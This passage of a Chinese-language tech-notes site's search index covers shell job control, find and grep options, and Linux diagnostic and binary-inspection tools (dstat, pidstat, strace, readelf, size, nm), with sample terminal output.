\u540e\u53f0\u63a5\u7740\u542f\u52a8\u6682\u505c\u4e2d\u76841\u53f7\u4efb\u52a1\uff0c\u4e5f\u53ef\u4ee5\u4f7f\u7528fg\u6765\u524d\u53f0\u542f\u52a8\n[1]  - 18653 continued  sleep 1000\n\n$ jobs\n[1]  - running    sleep 1000\n[2]  + running    nohup sleep 2000\n\n$ kill -SIGHUP %1   # \u4e5f\u53ef\u4ee5\u4f7f\u7528%\u4efb\u52a1\u7f16\u53f7\u7684\u5f62\u5f0f\uff0c\u4e0d\u4e00\u5b9a\u8981\u7528PID\n[1]  + 18653 hangup     sleep 1000\n\n$ jobs\n[2]  + running    nohup sleep 2000\n</code></pre></p>"},{"location":"other/shell/#_12","title":"\u5e38\u7528\u5de5\u5177","text":"<p>\u53ef\u4ee5\u4f7f\u7528<code>man</code>\u7a0b\u5e8f\u6765\u67e5\u770b\u4e00\u4e9b\u5176\u4ed6shell\u7a0b\u5e8f\u7684\u4f7f\u7528\u65b9\u6cd5\u548c\u53c2\u6570\uff0c\u4f8b\u5982<code>man ls</code>\u3002</p> <p>\u5e38\u7528\u7684\u5f00\u53d1\u7f16\u8bd1\u76f8\u5173\u5de5\u5177\u53ef\u53c2\u8003\u8fd9\u7bc7\u6587\u7ae0\u3002</p>"},{"location":"other/shell/#find","title":"find","text":"<p>\u4f7f\u7528<code>find \u8d77\u59cb\u76ee\u5f55 \u53c2\u6570</code>\u53ef\u4ee5\u65b9\u4fbf\u7684\u67e5\u627e\u6587\u4ef6\uff0c\u5e38\u7528\u7684\u53c2\u6570\u4e3a:</p> <ul> <li>-name\uff0c\u6309\u6587\u4ef6\u540d\uff0c-iname\u4e5f\u662f\u6309\u6587\u4ef6\u540d\u4f46\u53ef\u5ffd\u7565\u5927\u5c0f\u5199</li> <li>-type\uff0c\u6309\u6587\u4ef6\u7c7b\u578b\uff0cd\u4e3a\u76ee\u5f55\uff0cf\u4e3a\u6587\u4ef6</li> <li>-perm\uff0c\u6309\u6743\u9650\uff0c\u4f8b\u59820755</li> <li>-user\uff0c\u6309\u6240\u5c5e\u7528\u6237\u67e5\u627e</li> <li>-group\uff0c\u6309\u6240\u5c5e\u7528\u6237\u7ec4\u67e5\u627e</li> <li>-mtime\uff0c\u6309\u4fee\u6539\u65f6\u95f4\u67e5\u627e\uff0c+\u8868\u793a\u4ee5\u524d\uff0c-\u8868\u793a\u4ee5\u5185\uff0c\u5728mac\u4e0b\uff0c<code>-1d2h</code>\u8868\u793a1\u59292\u5c0f\u65f6\u4ee5\u5185\u4fee\u6539\u8fc7\u7684\u6587\u4ef6\uff0c\u5728linux\u4e0b\u53ea\u80fd\u8ddf\u4e00\u4e2a\u6570\u5b57\uff0c\u4f8b\u5982<code>-1</code>\u8868\u793a1\u5929\u5185\uff0c\u5982\u679c\u9700\u8981\u591a\u5c11\u5206\u949f\u5185\u5e94\u8be5\u7528-mmin</li> <li>-size\uff0c\u6309\u5927\u5c0f\u67e5\u627e\uff0c+\u8868\u793a\u5927\u4e8e\uff0c-\u8868\u793a\u5c0f\u4e8e\uff0c\u53ef\u4ee5\u8ddf\u5355\u4f4dk\u3001M\u3001G\u3001T</li> <li>-maxdepth\uff0c\u6307\u5b9a\u6700\u5927\u641c\u7d22\u6df1\u5ea6</li> <li>-executable\uff0c\u53ef\u6267\u884c\u6587\u4ef6</li> <li>-exec\uff0c\u6267\u884c\u76f8\u5173\u547d\u4ee4</li> </ul> <pre><code># \u6587\u4ef6\u540d\u5339\u914dind*.html\u7684\u6587\u4ef6\n\u279c  hjlarry.github.io git:(master) \u2717 find . -iname ind*.html\n./tags/index.html\n./docs/sicp/software-introduction/index.html\n# \u6587\u4ef6\u4fee\u6539\u65f6\u95f4\u57282\u5c0f\u65f6\u5185\u7684\u6587\u4ef6\n\u279c  hjlarry.github.io git:(master) \u2717 find . -type f -mmin -120 | xargs ls -lh\n-rw-rw-rw- 1 hejl hejl   98 May 24 10:12 ./.git/FETCH_HEAD\n-rw-r--r-- 1 hejl hejl   41 May 24 10:12 ./.git/ORIG_HEAD\n# \u6587\u4ef6\u5927\u5c0f\u5927\u4e8e2M\u7684\u6587\u4ef6\n\u279c  hjlarry.github.io git:(master) \u2717 find . -type f -size +2M | xargs ls -lh\n-r--r--r-- 1 hejl hejl 5.7M Apr  4 17:41 ./.git/modules/themes/book/objects/pack/pack-3a8d2ad7db7fe81a41409e60d27dce22b77b6c68.pack\n-r--r--r-- 1 hejl hejl 3.0M Apr 20 14:36 ./.git/objects/pack/pack-472a07bf934d028116265bd13cbea79d367c5e90.pack\n</code></pre>"},{"location":"other/shell/#grep","title":"grep","text":"<p>\u4f7f\u7528\u8be5\u547d\u4ee4\u53ef\u4ee5\u4ece\u6587\u4ef6\u6216\u7ba1\u9053\u4e2d\u67e5\u627e\u5177\u4f53\u7684\u5185\u5bb9\uff0c\u5176\u652f\u6301\u591a\u6587\u4ef6\u540d\uff0c\u652f\u6301\u901a\u914d\u7b26\uff0c\u5185\u5bb9\u5339\u914d\u65f6\u652f\u6301\u6b63\u5219\u8868\u8fbe\u5f0f\u3002\u5e38\u7528\u7684\u53c2\u6570\u4e3a:</p> <ul> <li>-r\uff0c\u9012\u5f52\u641c\u7d22\u6240\u6709\u5b50\u76ee\u5f55</li> <li>-l\uff0c\u4ec5\u8f93\u51fa\u6587\u4ef6\u540d</li> <li>-n\uff0c\u8f93\u51fa\u884c\u53f7</li> <li>-c\uff0c\u6309\u6587\u4ef6\u7edf\u8ba1\u5339\u914d\u6b21\u6570</li> <li>-v\uff0c\u6392\u9664\u6307\u5b9a\u5185\u5bb9</li> <li>-i\uff0c\u5ffd\u7565\u5927\u5c0f\u5199</li> <li>-e\uff0c\u591a\u6a21\u5f0f\u5339\u914d\uff0c\u547d\u4e2d\u5176\u4e00\u5373\u53ef</li> <li>-An\uff0c\u8f93\u51fa\u5176\u540en\u884c\u5185\u5bb9</li> <li>-Bn\uff0c\u8f93\u51fa\u5176\u524dn\u884c\u5185\u5bb9</li> <li>-Cn\uff0c\u8f93\u51fa\u5176\u524d\u540en\u884c\u5185\u5bb9</li> </ul> <pre><code>[ubuntu] ~/.mac $ grep -c \"main\" *\nalpine.sh:0\ngrep: assem: Is a directory\ntest.c:1\ntest.go:2\ntt:17\n[ubuntu] ~/.mac $ grep -n -i \"\\bmain\" *.go\n1:package main\n5:func main() {\n[ubuntu] ~/.mac $ objdump -d -M intel test | grep -A3 \"&lt;main.main&gt;\"\n0000000000452330 &lt;main.main&gt;:\n  452330:   64 48 8b 0c 25 f8 ff    mov    rcx,QWORD PTR fs:0xfffffffffffffff8\n  452337:   ff ff\n  452339:   48 3b 61 10             cmp    rsp,QWORD PTR [rcx+0x10]\n--\n  4523ae:   eb 80                   jmp    452330 &lt;main.main&gt;\n</code></pre>"},{"location":"other/tools/","title":"\u5e38\u7528\u5de5\u5177\u6574\u7406","text":""},{"location":"other/tools/#_2","title":"\u4f53\u68c0\u5de5\u5177","text":"<p>\u751f\u4ea7\u73af\u5883\u4e0d\u540c\u4e8e\u5f00\u53d1\u73af\u5883\uff0c\u751f\u4ea7\u73af\u5883\u5f80\u5f80\u662f\u4e00\u4e2a\u5f88\u5e72\u51c0\u7684\u3001\u53ea\u4fdd\u7559\u4e86\u76f8\u5173\u4f9d\u8d56\u7684\u73af\u5883\uff0c\u800c\u4e14\u9700\u8981\u8fd0\u884c\u5f88\u957f\u7684\u65f6\u95f4\u3002\u800c\u5f00\u53d1\u73af\u5883\u5c5e\u4e8e\u5b9e\u9a8c\u5ba4\u6027\u8d28\u7684\uff0c\u7c7b\u5e93\u6bd4\u8f83\u9f50\u5168\uff0c\u53ea\u8dd1\u4e2a\u5355\u5143\u6d4b\u8bd5\u6216\u8005benchmark\u4e4b\u7c7b\u7684\uff0c\u8fd0\u884c\u65f6\u95f4\u5f88\u77ed\u3002\u6240\u4ee5\u5f00\u53d1\u73af\u5883\u4e2d\u5f88\u5c0f\u7684\u95ee\u9898\u6bd4\u5982\u5185\u5b58\u6cc4\u6f0f\u51e0KB\uff0c\u5728\u751f\u4ea7\u73af\u5883\u968f\u7740\u65f6\u95f4\u7684\u7d2f\u79ef\u6216\u8005\u6210\u5343\u4e0a\u4e07\u7684\u8bbf\u95ee\uff0c\u53ef\u80fd\u4f1a\u628a\u5783\u573e\u56de\u6536\u5668\u641e\u5d29\u6e83\u3002\u8fd9\u79cd\u60c5\u51b5\u5982\u679c\u6211\u4eec\u4e0d\u64c5\u4e8e\u4f7f\u7528\u5de5\u5177\u53ef\u80fd\u627e\u4e0d\u5230\u4efb\u4f55\u95ee\u9898\u3002</p> <p>\u53e6\u5916\uff0c\u5f00\u53d1\u73af\u5883\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528100%\u7684\u8d44\u6e90\uff0c\u4f46\u751f\u4ea7\u73af\u5883\u4e00\u5b9a\u8981\u9884\u7559\u4e00\u4e9b\u8d44\u6e90\u7528\u6765\u505a\u8c03\u5ea6\u3001\u9884\u8b66\u4e4b\u7c7b\u7684\u3002</p>"},{"location":"other/tools/#dstat","title":"dstat","text":"<p>\u5b83\u80fd\u5b9e\u65f6\u67e5\u770b\u4e00\u4e9b\u57fa\u672c\u4fe1\u606f\uff0c\u9ed8\u8ba4\u60c5\u51b5\u4e0b\u5b83\u4f1a\u5305\u62ec:</p> <ul> <li>CPU\u57fa\u672c\u4fe1\u606f(\u7528\u6237\u4f7f\u7528\u65f6\u95f4\u3001\u7cfb\u7edf\u4f7f\u7528\u65f6\u95f4\u3001\u7a7a\u95f2\u65f6\u95f4\u7b49)</li> <li>\u78c1\u76d8\u57fa\u672c\u4fe1\u606f(\u8bfb\u3001\u5199)</li> <li>\u7f51\u7edc\u57fa\u672c\u4fe1\u606f(\u63a5\u53d7\u3001\u53d1\u9001)</li> <li>\u6362\u5165\u6362\u51fa\u4fe1\u606f</li> <li>\u7cfb\u7edf\u57fa\u672c\u4fe1\u606f(\u4e2d\u65ad\u7684\u6b21\u6570\u3001\u4e0a\u4e0b\u6587\u5207\u6362\u7684\u6b21\u6570)</li> </ul> <p>\u5982\u4e0b\u6240\u793a: <pre><code>[ubuntu] ~/.mac $ dstat\nYou did not select any stats, using -cdngy by default.\n--total-cpu-usage-- -dsk/total- -net/total- ---paging-- ---system--\nusr sys idl wai stl| read  writ| recv  send|  in   out | int   csw\n  0   0 100   0   0|2797B  597B|   0     0 |   0     0 |  90   236\n  0   0 100   0   0|   0     0 |   0     0 |   0     0 | 140   323\n  0   0 100   0   0|   0     0 |   0     0 |   0     0 | 163   376\n  0   1 100   0   0|   0     0 |   0     0 |   0     0 | 169   391\n</code></pre></p> <p>\u751f\u4ea7\u73af\u5883\u4e0b\u6211\u4eec\u7a0b\u5e8f\u51fa\u9519\u7684\u65f6\u5019\uff0c\u5e94\u8be5\u5148\u4ece\u5927\u7684\u65b9\u9762\u5165\u624b\u5b9a\u4f4d\u5230\u5177\u4f53\u662f\u54ea\u4e2a\u65b9\u9762\u7684\u95ee\u9898\uff0c\u770b\u770b\u5f53\u524d\u7684\u7cfb\u7edf\u73af\u5883\u6709\u6ca1\u6709\u95ee\u9898\uff0c\u662f\u4e0d\u662f\u6211\u4eec\u7684\u7a0b\u5e8f\u5728\u5f53\u524d\u7684\u7cfb\u7edf\u73af\u5883\u4e0b\u6c34\u571f\u4e0d\u670d\u3002\u6bd4\u5982\u7a0b\u5e8f\u662fIO\u5bc6\u96c6\u578b\u7684\uff0c\u7cfb\u7edf\u4e2d\u6709\u53e6\u4e00\u4e2a\u7a0b\u5e8f\u5728\u548c\u5b83\u62a2\u78c1\u76d8\u8d44\u6e90\u7b49\u3002\u53ef\u4ee5\u901a\u8fc7<code>dstat --list</code>\u67e5\u770b\u5b83\u80fd\u5bf9\u54ea\u4e9b\u7ec6\u5206\u9879\u76ee\u67e5\u770b\u5176\u60c5\u51b5\u3002\u67e5\u770b\u66f4\u591a\u4f7f\u7528\u793a\u4f8b</p>"},{"location":"other/tools/#sysstat","title":"sysstat","text":"<p>\u901a\u8fc7\u5b9a\u4f4d\u4e86\u7cfb\u7edf\u4e2d\u54ea\u4e2a\u65b9\u9762\u7684\u95ee\u9898\u4e4b\u540e\uff0c\u63a5\u7740\u6211\u4eec\u5e94\u8be5\u53bb\u5b9a\u4f4d\u6211\u4eec\u81ea\u5df1\u7a0b\u5e8f\u54ea\u4e2a\u65b9\u9762\u6709\u95ee\u9898\u3002sysstat\u53ef\u4ee5\u6839\u636e\u5355\u4e2a\u8fdb\u7a0b\u53bb\u68c0\u67e5\u5b83\u7684\u5404\u4e2a\u65b9\u9762\uff0c\u6bd4\u5982\u8bf4\u6211\u4eec\u5b9a\u4f4d\u5230\u662f\u5185\u5b58\u65b9\u9762\u7684\u95ee\u9898\uff0c\u63a5\u7740\u53bb\u770b\u81ea\u5df1\u7a0b\u5e8f\u4e2d\u5185\u5b58\u7684\u95ee\u9898: <pre><code>[ubuntu] ~/.mac $ pidstat -r -p `pidof tmux` 2\nLinux 4.9.184-linuxkit (cabd4e519687)   12/09/19    _x86_64_    (2 CPU)\n\n10:02:38      UID       PID  minflt/s  majflt/s     VSZ     RSS   %MEM  Command\n10:02:40        0        35      0.00      0.00   27424    4000   0.20  tmux: server\n10:02:42        0        35      0.00      0.00   27424    4000   0.20  tmux: server\n10:02:44        0        35      0.00      0.00   27424    4000   0.20  tmux: server\n10:02:46        0        35      0.00      0.00   27424    4000   0.20  tmux: server\n</code></pre> \u6211\u4eec\u628atmux\u5f53\u505a\u662f\u81ea\u5df1\u5199\u7684\u67d0\u4e2a\u7a0b\u5e8f\uff0c\u6bcf2\u79d2\u8f93\u51fa\u4e00\u6b21\u4fe1\u606f\u3002minflt/s\u5c31\u4ee3\u8868\u4e00\u4e9b\u5c0f\u8303\u56f4\u7684\u7f3a\u9875\u5f02\u5e38\uff0c\u53ef\u80fd\u662f\u4e00\u4e9b\u6570\u636e\u4e0d\u9700\u8981\u4e86\u53ea\u8981\u8865\u4e0a\u76f8\u5e94\u7684\u7269\u7406\u5185\u5b58\u5373\u53ef\u3002\u800cmajflt/s\u4ee3\u8868\u4e86\u9700\u8981\u4ece\u786c\u76d8\u6362\u5165\u5185\u5b58\uff0c\u8fd9\u53ef\u80fd\u5c31\u610f\u5473\u7740\u6211\u4eec\u7a0b\u5e8f\u662f\u4e0d\u662f\u6709\u7684\u4efb\u52a1\u4f18\u5148\u7ea7\u592a\u4f4e\u88ab\u64cd\u4f5c\u7cfb\u7edf\u6362\u51fa\u5230\u786c\u76d8\u4e0a\u4e86\uff0c\u6211\u4eec\u53ef\u80fd\u9700\u8981\u901a\u8fc7\u7cfb\u7edf\u8c03\u7528\u544a\u8bc9\u64cd\u4f5c\u7cfb\u7edf\u628a\u67d0\u6bb5\u5185\u5b58\u9501\u6b7b\u3002</p> <p>\u66f4\u8be6\u7ec6\u7684\u4f7f\u7528\u65b9\u6cd5\uff0c\u8bf7\u53c2\u8003\u5b98\u65b9\u6587\u6863\u3002</p>"},{"location":"other/tools/#strace","title":"strace","text":"<p>\u63a5\u7740\u6211\u4eec\u53ef\u4ee5\u6df1\u5165\u5230\u81ea\u5df1\u7a0b\u5e8f\u7684\u903b\u8f91\u4e2d\u53bb\uff0c\u6bd4\u5982\u4f7f\u7528strace\u68c0\u67e5\u6211\u4eec\u7a0b\u5e8f\u7684\u7cfb\u7edf\u8c03\u7528\u3002\u53ef\u80fd\u53ea\u662f\u4e00\u4e2a\u7b80\u5355\u7684\u7a0b\u5e8f: <pre><code>package main\n\nfunc main() {\n    println(\"hello world!\")\n}\n</code></pre></p> <p>\u5374\u6d89\u53ca\u5230\u5927\u91cf\u7684\u7cfb\u7edf\u8c03\u7528: <pre><code>[ubuntu] ~/.mac $ go build test.go\n[ubuntu] ~/.mac $ strace ~/.mac/test\nexecve(\"/root/.mac/test\", [\"/root/.mac/test\"], 0x7ffec1a0b740 /* 14 vars */) = 0\narch_prctl(ARCH_SET_FS, 0x4c5650)       = 0\nsched_getaffinity(0, 8192, [0, 1])      = 16\nopenat(AT_FDCWD, \"/sys/kernel/mm/transparent_hugepage/hpage_pmd_size\", O_RDONLY) = -1 ENOENT (No such file or directory)\nmmap(NULL, 262144, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7fd246a01000\nmmap(0xc000000000, 67108864, PROT_NONE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xc000000000\nmmap(0xc000000000, 67108864, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xc000000000\nmmap(NULL, 33554432, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7fd244a01000\nmmap(NULL, 2164736, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7fd2447f0000\nmmap(NULL, 65536, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7fd2447e0000\nmmap(NULL, 65536, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7fd2447d0000\nrt_sigprocmask(SIG_SETMASK, NULL, [], 8) = 0\nsigaltstack(NULL, {ss_sp=NULL, ss_flags=SS_DISABLE, ss_size=0}) = 0\nsigaltstack({ss_sp=0xc000002000, ss_flags=0, ss_size=32768}, NULL) = 0\nrt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0\ngettid()                                = 394\nrt_sigaction(SIGHUP, NULL, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=0}, 8) = 0\nrt_sigaction(SIGHUP, {sa_handler=0x44d8f0, sa_mask=~[], sa_flags=SA_RESTORER|SA_ONSTACK|SA_RESTART|SA_SIGINFO, sa_restorer=0x44da20}, NULL, 8) = 0\nrt_sigaction(SIGINT, NULL, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=0}, 8) = 0\nrt_sigaction(SIGINT, {sa_handler=0x44d8f0, sa_mask=~[], sa_flags=SA_RESTORER|SA_ONSTACK|SA_RESTART|SA_SIGINFO, sa_restorer=0x44da20}, NULL, 8) = 0\n\n......\n</code></pre></p> <p>\u6253\u5370\u8f93\u5165\u8f93\u51fa\u5fc5\u7136\u4f1a\u6d89\u53ca\u7cfb\u7edf\u8c03\u7528\uff0c\u4f46\u5982\u679c\u6211\u4eec\u4f7f\u7528\u4e00\u4e9b\u7b2c\u4e09\u65b9\u5e93\u65f6\u53d1\u73b0\u7cfb\u7edf\u8c03\u7528\u4ecd\u7136\u5f88\u591a\uff0c\u5c31\u53ef\u4ee5\u53bb\u67e5\u627e\u6709\u6ca1\u6709\u4f18\u5316\u66ff\u4ee3\u7684\u65b9\u6848\u3002</p> <p>\u4e00\u822c\uff0c\u6211\u4eec\u67e5\u770b\u4e00\u4e9b\u6458\u8981\u4fe1\u606f\u5373\u53ef: <pre><code>[ubuntu] ~/.mac $ strace -c ~/.mac/test\nhello world!\n% time     seconds  usecs/call     calls    errors syscall\n------ ----------- ----------- --------- --------- ----------------\n  0.00    0.000000           0         1           write\n  0.00    0.000000           0         7           mmap\n  0.00    0.000000           0       114           rt_sigaction\n  0.00    0.000000           0         6           rt_sigprocmask\n  0.00    0.000000           0         2           clone\n  0.00    0.000000           0         1           execve\n  0.00    0.000000           0         2           sigaltstack\n  0.00    0.000000           0         1           arch_prctl\n  0.00    0.000000           0         1           gettid\n  0.00    0.000000           0         3           futex\n  0.00    0.000000           0         1           sched_getaffinity\n  0.00    0.000000           0         1         1 openat\n------ ----------- ----------- --------- --------- ----------------\n100.00    0.000000                   140         1 total\n</code></pre></p>"},{"location":"other/tools/#_3","title":"\u5f00\u53d1\u5de5\u5177","text":"<p>GNU\u901a\u7528\u7684\u5f00\u53d1\u5de5\u5177\uff0c\u4e5f\u53eb\u200bbinutils\uff0c\u662f\u4e00\u4e2a\u6807\u51c6\uff0c\u5c5e\u4e8e\u968f\u8eab\u5e26\u7684\u745e\u58eb\u519b\u5200\uff0c\u4efb\u4f55\u8bed\u8a00\u7f16\u5199\u7684\u7a0b\u5e8f\u90fd\u9002\u7528\uff0c\u4f46\u53ef\u80fd\u4e0e\u8bed\u8a00\u81ea\u5e26\u7684\u5de5\u5177\u94fe\u7ec6\u8282\u4e0a\u6709\u4e9b\u51fa\u5165\u3002\u5b98\u65b9\u7f51\u7ad9</p> <p>\u5b83\u4e3b\u8981\u5305\u62ec:</p> <ul> <li>readelf : \u67e5\u770bELF\u6587\u4ef6\u4fe1\u606f\u3002</li> <li>objdump : \u7528\u6237\u2f6c\u6807\u6587\u4ef6\u53cd\u6c47\u7f16\u3002</li> <li>ldd : \u67e5\u770b\u76ee\u6807\u6587\u4ef6\u7684\u52a8\u6001\u4f9d\u8d56\u5e93\u3002</li> <li>addr2line : \u5c06\u5730\u5740\u8f6c\u6362\u4e3a\u6587\u4ef6\u884c\u53f7\u4fe1\u606f\u3002</li> <li>nm : \u67e5\u770b\u7b26\u53f7\u8868\u3002</li> <li>strip : \u5220\u9664\u7b26\u53f7\u8868\u3002</li> <li>objcopy : \u62f7\u2ec9\u6570\u636e\u5230\u2f6c\u6807\u6587\u4ef6\u3002</li> <li>strings : \u8f93\u51fa\u5b57\u7b26\u4e32\u3002</li> <li>size : \u67e5\u770b\u5404\u6bb5\u2f24\u5c0f\u3002</li> </ul> <p>\u5f53\u6211\u4eec\u4e0d\u719f\u6089\u4e00\u95e8\u8bed\u8a00\u5199\u7684\u7a0b\u5e8f\u65f6\uff0c\u6211\u4eec\u53ef\u4ee5\u628a\u5b83\u7ffb\u8bd1\u6210\u6c47\u7f16\u8bed\u8a00\uff0c\u5728\u628a\u6c47\u7f16\u8bed\u8a00\u7ffb\u8bd1\u6210C\u8bed\u8a00\uff0c\u4e5f\u8bb8\u8fd9\u4e2aC\u8bed\u8a00\u65e0\u6cd5\u8fd0\u884c\uff0c\u4f46\u65b9\u4fbf\u4e86\u6211\u4eec\u9605\u8bfb\u548c\u7406\u89e3\u7a0b\u5e8f\u7684\u601d\u8def\u3002</p>"},{"location":"other/tools/#readelf","title":"readelf","text":"<p>\u67e5\u770belf\u6587\u4ef6\u7684\u5934\u90e8\u4fe1\u606f: <pre><code>[ubuntu] ~/.mac/assem $ readelf -h hello\nELF Header:\n  Magic:   7f 45 4c 46 02 01 01 00 00 00 00 00 00 00 00 00      // \u9b54\u6cd5\u6570\uff0c\u53ef\u4ee5\u5feb\u901f\u8bfb\u53d6\u51fa\u6765\u7528\u4e8e\u9884\u5224\u6574\u4e2a\u6587\u4ef6\u662f\u4e0d\u662f\u4e00\u4e2a\u5408\u6cd5\u7684\u5185\u5bb9\n  Class:                             ELF64          // ELF\u6587\u4ef6\u7684\u683c\u5f0f\n  Data:                              2's complement, little endian  // \u5927\u5c0f\u7aef\u60c5\u51b5\n  Version:                           1 (current)\n  OS/ABI:                            UNIX - System V    // \u54ea\u4e2a\u5e73\u53f0\u4f7f\u7528\n  ABI Version:                       0\n  Type:                              EXEC (Executable file)     // \u54ea\u79cd\u7c7b\u578b\uff0c\u53ef\u6267\u884c\u7684\u8fd8\u662f\u9700\u91cd\u5b9a\u4f4d\u7684\u7b49\n  Machine:                           Advanced Micro Devices X86-64\n  Version:                           0x1\n  Entry point address:               0x4000b0       //\u5165\u53e3\u5730\u5740\n  Start of program headers:          64 (bytes into file)\n  Start of section headers:          736 (bytes into file)\n  Flags:                             0x0\n  Size of this header:               64 (bytes)\n  Size of program headers:           56 (bytes)\n  Number of program headers:         2\n  Size of section headers:           64 (bytes)\n  Number of section headers:         8\n  Section header string table index: 7\n</code></pre></p> <p>\u67e5\u770b\u5176\u6267\u884c\u65f6\u9700\u8981\u5411\u5185\u5b58(\u8fdb\u7a0b)\u4e2d\u8f7d\u5165\u54ea\u4e9b\u4fe1\u606f: <pre><code>[ubuntu] ~/.mac/assem $ readelf -l hello\nElf file type is EXEC (Executable file)\nEntry point 0x4000b0\nThere are 2 program headers, starting at offset 64\nProgram Headers:\n  Type           Offset             VirtAddr           PhysAddr\n                 FileSiz            MemSiz              Flags  Align\n  LOAD           0x0000000000000000 0x0000000000400000 0x0000000000400000\n                 0x00000000000000d5 0x00000000000000d5  R E    0x200000\n  LOAD           0x00000000000000d8 0x00000000006000d8 0x00000000006000d8\n                 0x000000000000000e 0x000000000000000e  RW     0x200000\n Section to Segment mapping:\n  Segment Sections...\n   00     .text\n   01     .data\n</code></pre></p> <p>\u67e5\u770b\u5176\u672c\u8eab\u7684section\u4fe1\u606f: <pre><code>[ubuntu] ~/.mac/assem $ readelf -S hello\nThere are 8 section headers, starting at offset 0x2e0:\nSection Headers:\n  [Nr] Name              Type             Address           Offset\n       Size              EntSize          Flags  Link  Info  Align\n  [ 0]                   NULL             0000000000000000  00000000\n       0000000000000000  0000000000000000           0     0     0\n  [ 1] .text             PROGBITS         00000000004000b0  000000b0\n       0000000000000025  0000000000000000  AX       0     0     16\n  [ 2] .data             PROGBITS         00000000006000d8  000000d8\n       000000000000000e  0000000000000000  WA       0     0     4\n  [ 3] .stab             PROGBITS         0000000000000000  000000e8\n       0000000000000084  0000000000000014           4     0     4\n  [ 4] .stabstr          STRTAB           0000000000000000  0000016c\n       0000000000000009  0000000000000000           0     0     1\n  [ 5] .symtab           SYMTAB           0000000000000000  00000178\n       0000000000000108  0000000000000018           6     7     8\n  [ 6] .strtab           STRTAB           0000000000000000  00000280\n       0000000000000027  0000000000000000           0     0     1\n  [ 7] .shstrtab         STRTAB           0000000000000000  000002a7\n       0000000000000036  0000000000000000           0     0     1\nKey to Flags:\n  W (write), A (alloc), X (execute), M (merge), S (strings), I (info),\n  L (link order), O (extra OS processing required), G (group), T (TLS),\n  C (compressed), x (unknown), o (OS specific), E (exclude),\n  l (large), p (processor specific)\n</code></pre></p> <p>\u67e5\u770b\u5176section\u7684\u5185\u5bb9\uff0c\u4f8b\u5982\u6211\u4eec\u60f3\u770b\u5176<code>.data</code>\u6bb5\u7684\uff0c\u5b83\u662f\u7b2c2\u4e2a\u6bb5\uff0c\u53ef\u4ee5\u4f7f\u752816\u8fdb\u5236\u548c\u5b57\u7b26\u4e32\u7684\u65b9\u5f0f: <pre><code>[ubuntu] ~/.mac/assem $ readelf -x 2 hello\nHex dump of section '.data':\n  0x006000d8 68656c6c 6f2c2077 6f726c64 210a     hello, world!.\n[ubuntu] ~/.mac/assem $ readelf -p 2 hello\nString dump of section '.data':\n  [     0]  hello, world!\n</code></pre></p> <p>\u67e5\u770b\u5176\u7b26\u53f7\u8868\u4fe1\u606f: <pre><code>[ubuntu] ~/.mac/assem $ readelf -s hello\nSymbol table '.symtab' contains 11 entries:\n   Num:    Value          Size Type    Bind   Vis      Ndx Name\n     0: 0000000000000000     0 NOTYPE  LOCAL  DEFAULT  UND\n     1: 00000000004000b0     0 SECTION LOCAL  DEFAULT    1\n     2: 00000000006000d8     0 SECTION LOCAL  DEFAULT    2\n     3: 0000000000000000     0 SECTION LOCAL  DEFAULT    3\n     4: 0000000000000000     0 SECTION LOCAL  DEFAULT    4\n     5: 0000000000000000     0 FILE    LOCAL  DEFAULT  ABS hello.s\n     6: 00000000006000d8     1 OBJECT  LOCAL  DEFAULT    2 hello\n     7: 00000000004000b0     0 NOTYPE  GLOBAL DEFAULT    1 _start\n     8: 00000000006000e6     0 NOTYPE  GLOBAL DEFAULT    2 __bss_start\n     9: 00000000006000e6     0 NOTYPE  GLOBAL DEFAULT    2 _edata\n    10: 00000000006000e8     0 NOTYPE  GLOBAL DEFAULT    2 _end\n</code></pre></p> <ul> <li>ABS \u8868\u793a\u65e0\u9700\u94fe\u63a5\u5668\u5904\u7406\u3002</li> <li>UND \u8868\u793a\u5728\u672c\u5730\u5f15\u7528\u7684\u5916\u90e8\u5168\u5c40\u7b26\u53f7\u3002</li> <li>COM \u8868\u793a\u672a\u521d\u59cb\u5316\uff0c\u6bd4\u5982\u5206\u914d\u5728<code>.bss</code>\u7684\u5168\u5c40\u53d8\u91cf\u3002</li> <li>OBJECT \u53d8\u91cf\u3002</li> </ul> <p>\u6b64\u5916\uff0c<code>-e</code>\u4ee3\u8868\u540c\u65f6\u52a0\u4e0a<code>-h -l -S</code>\u4e09\u4e2a\u53c2\u6570\u3002</p>"},{"location":"other/tools/#size","title":"size","text":"<p>\u4f7f\u7528size\u53ef\u4ee5\u5feb\u6377\u7684\u67e5\u770b\u5176<code>.text</code>\u3001<code>.data</code>\u3001<code>.bss</code>\u6bb5\u7684\u5927\u5c0f: <pre><code>root@cabd4e519687:~/.mac# size test\n   text    data     bss     dec     hex filename\n 783967   10904  121704  916575   dfc5f test\n</code></pre> dec\u8868\u793a\u8fd9\u4e09\u4e2a\u6bb5\u52a0\u8d77\u6765\u7684\u5927\u5c0f\uff0chex\u662f\u628adec\u8f6c\u6362\u4e3a16\u8fdb\u5236\u540e\u7684\u503c\u3002</p>"},{"location":"other/tools/#nm","title":"nm","text":"<p>\u4f7f\u7528nm\u4e5f\u53ef\u67e5\u770b\u5176\u7b26\u53f7\u8868\u4fe1\u606f:</p> <pre><code>[ubuntu] ~/.mac/assem $ nm hello\n00000000006000e6 D __bss_start\n00000000006000e6 D _edata\n00000000006000e8 D _end\n00000000004000b0 T _start\n00000000006000d8 d hello\n</code></pre> 